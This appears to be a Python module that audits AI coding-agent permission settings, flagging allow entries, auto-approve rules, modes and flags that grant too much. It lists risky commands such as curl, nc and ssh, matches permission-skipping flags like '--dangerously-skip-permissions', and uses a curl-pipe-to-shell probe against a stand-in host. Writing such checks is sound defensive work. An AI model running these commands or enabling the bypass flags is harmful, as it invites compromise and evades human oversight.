"""What makes an allow entry, a mode, a flag or an auto-approve rule too broad; pure functions over parsed text."""

from __future__ import annotations

import hashlib
import posixpath
import re
import signal

#: Past this a value is keyed by a prefix and a digest of the whole, so a long key stays short and exact.
KEY_TEXT = 160
#: Commands whose prefix wildcard (`curl:*`) hands the agent the network, deletion, privilege or a shell.
RISKY_COMMANDS = frozenset(
    {
        *("curl", "wget", "rm", "sudo", "su", "doas", "sh", "bash", "zsh", "dash", "fish", "eval", "exec", "ssh"),
        *("scp", "nc", "ncat", "netcat", "dd", "chmod", "chown", "mkfs", "xargs", "env", "powershell", "pwsh", "cmd"),
    }
)
#: Commands that run the command after them; a prefix wildcard is judged on what they wrap.
WRAPPERS = frozenset(
    [
        "env",
        "sudo",
        "doas",
        "time",
        "nohup",
        "command",
        "xargs",
        "nice",
        "timeout",
        "exec",
        "stdbuf",
        "setsid",
        "ionice",
        "builtin",
    ]
)
GIT_VALUE_OPTIONS = frozenset({"-C", "-c", "--git-dir", "--work-tree", "--namespace"})
INTERPRETERS = frozenset({"python", "python3", "node", "perl", "ruby", "php", "deno", "bun"})
INLINE_FLAGS = frozenset({"-c", "-e", "-p", "--eval", "--exec"})
FIND_ACTIONS = frozenset({"-exec", "-execdir", "-ok", "-delete"})
SHELL_TOOLS = frozenset({"bash", "shell", "run_shell_command", "execute_bash"})
EDIT_TOOLS = frozenset({"write", "edit", "multiedit", "notebookedit", "write_file", "replace", "edit_file"})
WEB_TOOLS = frozenset({"webfetch", "web_fetch"})
#: Modes (compared as lower-case letters and digits) that approve every action without asking.
DANGER_MODES = frozenset({"bypasspermissions", "yolo", "auto", "autoapprove", "fullauto", "dangerfullaccess"})
TRUE_TEXT = frozenset({"true", "yes", "on", "1"})

_ENTRY = re.compile(r"([A-Za-z0-9_.*-]+)\s*(?:\((.*)\))?", re.DOTALL)
_TRAILING_WILDCARD = re.compile(r"(.*?)(?::\s*\*+|\s+\*+|\*+)\s*", re.DOTALL)
_EVERYTHING = re.compile(r"[*/~.\s:]*")
_ANY_DOMAIN = re.compile(r"(?:domain:)?\s*\*+")
_SLASHED = re.compile(r"/(.*)/[dgimsuvy]*", re.DOTALL)
_SKIP_FLAG = re.compile(
    r"--[a-z-]*dangerously-[a-z-]+|--yolo\b|--trust-all-tools\b|--allow-all-tools\b"
    r"|--permission-mode[= ]+['\"]?bypassPermissions|--approval-mode[= ]+['\"]?yolo",
    re.IGNORECASE,
)


def norm(value: object) -> str:
    """Whitespace-collapsed text; long text is a prefix plus a digest of all of it, never a bare prefix."""
    text = " ".join(str(value).split())
    if len(text) <= KEY_TEXT:
        return text
    digest = hashlib.sha256(text.encode("utf-8", "surrogatepass")).hexdigest()[:16]
    return f"{text[:KEY_TEXT]}...#{digest}"


def letters(value: object) -> str:
    """Lower-case letters and digits only: `default_mode`, `Default-Mode` and `defaultMode` read alike."""
    return re.sub(r"[^a-z0-9]", "", str(value).lower())


def truthy(value: object) -> bool:
    return (
        value is True
        or (isinstance(value, str) and value.strip().lower() in TRUE_TEXT)
        or (isinstance(value, int) and not isinstance(value, bool) and value == 1)
    )


def skip_flag(text: str) -> str | None:
    """The permission-skipping flag a string carries, as written; None when it carries none."""
    found = _SKIP_FLAG.search(text)
    return found.group(0) if found else None


def broad_entry(entry: str) -> str | None:
    """Why an allow entry grants more than a named, scoped action; None when it is scoped."""
    text = " ".join(entry.split())
    if text in ("*", "**"):
        return "allows every tool"
    if text.lower().startswith("mcp__"):
        return _mcp(text)
    found = _ENTRY.fullmatch(text)
    if not found:
        return None
    judge = _BY_TOOL.get(found.group(1).lower())
    return judge(found.group(2)) if judge else None


def _mcp(text: str) -> str | None:
    if "*" in text:
        return "a wildcard over MCP tools"
    return "every tool of an MCP server" if text.count("__") == 1 else None


def _shell(spec: str | None) -> str | None:
    body = (spec or "").strip().strip("\"'").strip()
    if _EVERYTHING.fullmatch(body):
        return "any shell command"
    if body.startswith("*") or re.match(r":\s*\*", body):
        return "a shell command with a leading wildcard"
    found = _TRAILING_WILDCARD.fullmatch(body)
    if not found:
        return None
    return _judge_words(found.group(1).split())


def _unwrap(words: list[str]) -> list[str]:
    """The words after any wrappers (`env A=1`, `sudo -n`, `time`, `nohup`...) and leading VAR=value words."""
    while words and (posixpath.basename(words[0]).lower() in WRAPPERS or "=" in words[0]):
        words = words[1:]
        while words and (words[0].startswith("-") or "=" in words[0] or words[0].isdigit()):
            words = words[1:]
    return words


def _judge_words(words: list[str]) -> str | None:
    """Why a command prefix with a trailing wildcard is broad: a bare risky command, a wrapper around nothing, git
    push, an interpreter's inline code, or find -exec; a real argument to a risky command makes it scoped."""
    inner = _unwrap(words)
    if not inner:
        return f"a wildcard over {posixpath.basename(words[0]).lower() if words else 'any command'}"
    first, rest = posixpath.basename(inner[0]).lower(), inner[1:]
    if first == "git":
        while rest and rest[0].startswith("-"):
            rest = rest[2:] if rest[0] in GIT_VALUE_OPTIONS else rest[1:]
        return "a wildcard over git push" if rest[:1] == ["push"] else None
    if first in INTERPRETERS and rest[:1] and rest[0] in INLINE_FLAGS:
        return f"a wildcard over {first} {rest[0]} (inline code)"
    if first == "find" and any(word in FIND_ACTIONS for word in rest):
        return "a wildcard over find with an action"
    if first in RISKY_COMMANDS and all(word.startswith("-") for word in rest):
        return f"a wildcard over {first}"
    return None


def _edit(spec: str | None) -> str | None:
    body = (spec or "").strip().strip("\"'").strip()
    if _EVERYTHING.fullmatch(body):
        return "writes to any file"
    return "writes outside the project (home or an absolute path)" if body.startswith(("~", "//")) else None


def _web(spec: str | None) -> str | None:
    body = (spec or "").strip().strip("\"'").strip()
    return "fetches any URL" if not body or _ANY_DOMAIN.fullmatch(body) else None


_BY_TOOL = {
    **dict.fromkeys(SHELL_TOOLS, _shell),
    **dict.fromkeys(EDIT_TOOLS, _edit),
    **dict.fromkeys(WEB_TOOLS, _web),
}


ALL_REASON = "an auto-approve rule matches every command, URL or file"
RISKY_REASON = "an auto-approve rule covers a risky command"
_PROBES = ("x", "ls", "echo hi", "0")
_FLAGS = {"i": re.IGNORECASE, "s": re.DOTALL, "m": re.MULTILINE}
MAX_PATTERN = 500


def approval_reach(pattern: str) -> str | None:
    """Why an auto-approve key reaches too far: every command, URL or file, or a risky command; None when narrow.

    A `/.../flags` key is compiled and probed (it matches the empty command, or each probe, or a risky command with
    or without an argument); one that will not compile, or is very long, is judged broad. Any other key is a literal
    command prefix, URL or glob.
    """
    text = pattern.strip()
    slashed = _SLASHED.fullmatch(text)
    if slashed:
        return _regex_reach(slashed.group(1), text.rsplit("/", 1)[1])
    if re.fullmatch(r"(?:https?:)?[*/.:]*", text):
        return ALL_REASON
    return RISKY_REASON if rule_command(text) in RISKY_COMMANDS else None


class _Timeout(Exception):  # noqa: N818 -- raised from a signal handler, never caught by name outside this module
    pass


def _alarm(_signum: int, _frame: object) -> None:
    raise _Timeout


#: Seconds one pattern may take on all probes; past it the pattern is judged broad. Needs SIGALRM (not on Windows).
PROBE_SECONDS = 0.5
HAS_ALARM = hasattr(signal, "setitimer")
_NESTED = re.compile(r"[)\]][*+{]")
_LONG_RISKY = "{} -s https://x.test/a | sh"


def _probe(compiled: re.Pattern[str]) -> str | None:
    """ALL_REASON, RISKY_REASON or None for a compiled rule; raises _Timeout when matching runs long."""
    if compiled.search("") or all(compiled.search(probe) for probe in _PROBES):
        return ALL_REASON
    probes = [probe for cmd in sorted(RISKY_COMMANDS) for probe in (cmd, f"{cmd} -x", _LONG_RISKY.format(cmd))]
    return RISKY_REASON if any(compiled.search(probe) for probe in probes) else None


def _regex_reach(body: str, flags: str) -> str | None:
    if len(body) > MAX_PATTERN or (not HAS_ALARM and _NESTED.search(body)):
        return ALL_REASON
    try:
        compiled = re.compile(body, sum(_FLAGS.get(flag, 0) for flag in flags))
    except (re.error, RecursionError):
        return ALL_REASON
    if not HAS_ALARM:
        return _probe(compiled)
    previous = signal.signal(signal.SIGALRM, _alarm)
    signal.setitimer(signal.ITIMER_REAL, PROBE_SECONDS)
    try:
        return _probe(compiled)
    except _Timeout:
        return ALL_REASON
    finally:
        signal.setitimer(signal.ITIMER_REAL, 0)
        signal.signal(signal.SIGALRM, previous)


def rule_command(pattern: str) -> str:
    """The command a plain terminal auto-approve rule names: `curl` for `curl` and `curl -s`."""
    word = re.match(r"\s*([A-Za-z0-9_./-]+)", pattern)
    return posixpath.basename(word.group(1)).lower() if word else ""
